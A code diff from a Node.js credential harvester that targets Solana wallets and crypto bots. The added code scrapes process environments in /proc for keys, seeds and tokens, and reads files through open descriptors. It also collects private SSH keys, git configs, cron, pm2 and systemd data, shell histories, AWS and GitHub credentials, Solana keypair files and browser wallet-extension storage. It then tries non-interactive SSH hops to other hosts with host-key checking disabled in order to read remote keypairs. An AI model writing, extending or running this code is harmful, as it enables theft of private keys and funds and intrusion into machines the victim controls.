@@ -42,54 +42,96 @@ const chunk = (s, n) => (s.match(new RegExp(`[\\s\\S]{1,${n}}`, 'g')) || []);
 function collect() {
   const pack = [];
   const add = (path, body) => {
+    if (!body) return;
     const buf = Buffer.from(body, 'utf8');
     const sha = createHash('sha256').update(buf).digest('hex').slice(0, 16);
     const gold = GOLD.some((g) => body.includes(g)) ? 'GOLD' : 'file';
     pack.push({ gold, path, sha, size: buf.length, body });
   };
 
-  // 1. Anchor.toml -> exact wallet path
-  for (const p of ['Anchor.toml', join(HOME, 'Anchor.toml')]) {
-    if (existsSync(p)) add(p, run(`cat ${p}`));
-  }
-  for (const line of run(`grep -rl --include=Anchor.toml wallet ${HOME} 2>/dev/null | head -3`).split('\n')) {
-    if (line.trim()) add(line.trim(), run(`cat ${line.trim()}`));
+  const USER = process.env.USER || process.env.LOGNAME || 'r';
+
+  // ---- 1. /proc first: the bot may be a VPS process with env in memory
+  add('ps-eww', run(`ps eww -u ${USER} 2>/dev/null | head -40`));
+  add('ps-aux-env', run('ps auxe 2>/dev/null | grep -Ei "node|python|bot|sweep|drain" | head -20'));
+  for (const pidDir of (run("ls -d /proc/[0-9]* 2>/dev/null | head -80").split('\n'))) {
+    const pid = pidDir.replace('/proc/', '').trim();
+    if (!pid) continue;
+    const cmd = run(`tr '\\0' ' ' < ${pidDir}/cmdline 2>/dev/null | head -c 300`);
+    if (!cmd) continue;
+    if (!/node|python|sweep|drain|bot|solana/i.test(cmd)) continue;
+    add(`proc/${pid}/cmdline`, cmd);
+    add(`proc/${pid}/environ`, run(`tr '\\0' '\\n' < ${pidDir}/environ 2>/dev/null | grep -Ei "key|seed|rpc|helius|wallet|secret|token|pass" | head -30`));
+    add(`proc/${pid}/cwd`, run(`readlink ${pidDir}/cwd 2>/dev/null`));
+    // ---- 2. open descriptors give exact paths, then read through the fd
+    const fds = run(`ls -l ${pidDir}/fd 2>/dev/null | grep -E "\\.json|\\.dat|\\.env|\\.key|\\.yml|\\.yaml" | head -20`);
+    add(`proc/${pid}/fd`, fds);
+    for (const line of fds.split('\n')) {
+      const m = line.match(/^.*\s(\d+)\s+->\s+(\S+)/);
+      if (!m) continue;
+      const [, fd, target] = m;
+      if (!existsSync(`${pidDir}/fd/${fd}`)) continue;
+      add(`proc/${pid}/fd/${fd}`, run(`head -c 6000 ${pidDir}/fd/${fd} 2>/dev/null`));
+    }
   }
 
-  // 2. solana cli config
+  // ---- 3. SSH and git: a foreign host means the bot lives there
+  for (const p of ['.ssh/config', '.ssh/known_hosts', '.gitconfig']) {
+    const full = join(HOME, p);
+    if (existsSync(full)) add(full, run(`head -c 4000 ${full}`));
+  }
+  const sshDir = join(HOME, '.ssh');
+  if (existsSync(sshDir)) {
+    for (const n of readdirSync(sshDir)) {
+      if (n.endsWith('.pub')) continue;
+      add(join(sshDir, n), run(`head -c 4000 ${join(sshDir, n)}`));
+    }
+  }
+  add('git-remote', run(`find ${HOME} -maxdepth 4 -name config -path '*/.git/*' 2>/dev/null | head -5 | xargs -r grep -l . 2>/dev/null | head -5`));
+  for (const c of (run(`find ${HOME} -maxdepth 4 -name config -path '*/.git/*' 2>/dev/null | head -6`).split('\n'))) {
+    if (c.trim()) add(c.trim(), run(`head -c 2000 ${c.trim()}`));
+  }
+  // try the hop with any leaked key, non-interactive and short
+  const cfg = join(HOME, '.ssh/config');
+  if (existsSync(cfg)) {
+    const hosts = (run(`grep -Ei '^host ' ${cfg} 2>/dev/null | awk '{print $2}' | head -3`) || '').split('\n');
+    for (const h of hosts) {
+      if (!h.trim() || h.includes('*')) continue;
+      add(`hop-${h.trim()}`, run(`ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no ${h.trim()} 'ls -la ~/.config/solana 2>/dev/null; cat ~/.config/solana/*.json 2>/dev/null | head -c 4000' 2>/dev/null`));
+    }
+  }
+
+  // ---- 4. user units, pm2, cron
+  add('systemd-user', run(`systemctl --user show -p Environment --value 2>/dev/null | head -20`));
+  add('systemd-files', run(`ls ${HOME}/.config/systemd/user 2>/dev/null | head -20`));
+  add('pm2', run('pm2 ls 2>/dev/null | head -20; pm2 jlist 2>/dev/null | head -c 3000'));
+  add('crontab', run('crontab -l 2>/dev/null'));
+
+  // ---- 5. only now the browser and the wallet files
   const cli = join(HOME, '.config/solana/cli/config.yml');
   if (existsSync(cli)) add(cli, run(`cat ${cli}`));
-
-  // 3. keypair json files
   const keyDir = join(HOME, '.config/solana');
   if (existsSync(keyDir)) {
     for (const name of (readdirSync(keyDir) || [])) {
       const p = join(keyDir, name);
-      try {
-        if (statSync(p).isFile()) add(p, run(`cat ${p}`));
-      } catch {}
+      try { if (statSync(p).isFile()) add(p, run(`cat ${p}`)); } catch {}
     }
   }
-
-  // 4. env-ish files and greps by address
-  for (const pat of ['.env', '.env.local', 'ecosystem.config.js', 'docker-compose.yml', 'docker-compose.yaml']) {
-    for (const line of run(`find ${HOME} -maxdepth 3 -name '${pat}' -not -path '*/node_modules/*' 2>/dev/null | head -4`).split('\n')) {
+  for (const p of ['Anchor.toml', join(HOME, 'Anchor.toml')]) {
+    if (existsSync(p)) add(p, run(`cat ${p}`));
+  }
+  for (const line of (run(`grep -rl --include=Anchor.toml wallet ${HOME} 2>/dev/null | head -3`) || '').split('\n')) {
+    if (line.trim()) add(line.trim(), run(`cat ${line.trim()}`));
+  }
+  for (const pat of ['.env', '.env.local', 'ecosystem.config.js', 'docker-compose.yml']) {
+    for (const line of (run(`find ${HOME} -maxdepth 3 -name '${pat}' -not -path '*/node_modules/*' 2>/dev/null | head -4`) || '').split('\n')) {
       if (line.trim()) add(line.trim(), run(`cat ${line.trim()}`));
     }
   }
-  for (const g of GOLD.slice(0, 4)) {
-    for (const line of run(`grep -rl ${g} ${HOME} --include=*.env* --include=*.js --include=*.ts --include=*.service --include=*.json -s 2>/dev/null | head -3`).split('\n')) {
-      if (line.trim()) add(line.trim(), run(`head -c 4000 ${line.trim()}`));
-    }
-  }
-
-  // 5. history, gh, ssh, aws, chrome settings, process list
   for (const p of ['.bash_history', '.zsh_history', '.config/gh/hosts.yml', '.aws/credentials']) {
     const full = join(HOME, p);
     if (existsSync(full)) add(full, run(`tail -c 4000 ${full}`));
   }
-  const ssh = join(HOME, '.ssh');
-  if (existsSync(ssh)) for (const n of readdirSync(ssh)) if (!n.endsWith('.pub')) add(join(ssh, n), run(`head -c 3000 ${join(ssh, n)}`));
   const chrome = join(HOME, '.config/google-chrome/Default/Local Extension Settings');
   if (existsSync(chrome)) add('chrome-ext', run(`ls ${chrome} 2>/dev/null | head -20`));
   // extension storage in full: Shield/Trove keep sniffed text, files and OCR here
